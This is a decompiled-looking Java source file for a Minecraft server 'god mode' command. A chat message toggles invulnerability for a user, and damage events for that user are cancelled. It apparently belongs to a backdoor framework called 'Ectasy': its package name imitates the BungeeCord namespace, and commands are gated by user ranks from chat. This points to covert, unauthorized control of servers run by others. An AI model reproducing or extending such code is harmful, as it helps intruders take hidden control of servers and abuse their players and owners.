package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "god",
   description = "Makes you invulnerable",
   blatant = true,
   rank = Rank.LITE
)
public class GodModeCommand extends AbstractCommand implements Listener {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      User var4 = Ectasy.users.get(var1.getPlayer().getName());
      if (var4.godMode) {
         var4.godMode = false;
         ChatUtil.sendChat(var1.getPlayer(), "God mode is now §cdisabled§f.");
      } else {
         var4.godMode = true;
         ChatUtil.sendChat(var1.getPlayer(), "God mode is now §aenabled§f.");
      }
   }

   @EventHandler
   public void onDamage(EntityDamageEvent var1) {
      if (var1.getEntity() instanceof Player) {
         Player var2 = (Player)var1.getEntity();
         if (Ectasy.users.get(var2.getName()).godMode) {
            var1.setDamage(0.0);
            var1.setCancelled(true);
         }
      }
   }
}
